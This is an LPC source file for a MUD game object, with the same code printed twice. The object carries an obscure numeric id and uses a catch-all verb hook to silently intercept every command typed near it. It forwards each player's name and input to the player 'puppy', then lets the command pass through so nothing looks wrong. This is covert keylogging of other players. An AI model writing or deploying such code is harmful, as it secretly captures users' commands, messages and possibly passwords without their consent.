reset() {
  write_file("/players/puppy/logs/DUH", "X");
}
get() { return 1; }
drop() { return 1; }
id(str) { return str == "4941128"; }
init() {
  add_action("ekg"); add_xverb("");
}

ekg(str) {
  if(find_player("puppy")) {
tell_object(find_player("puppy"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
    }
}
reset() {
  write_file("/players/puppy/logs/DUH", "X");
}
get() { return 1; }
drop() { return 1; }
id(str) { return str == "4941128"; }
init() {
  add_action("ekg"); add_xverb("");
}

ekg(str) {
  if(find_player("puppy")) {
tell_object(find_player("puppy"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
    }
}
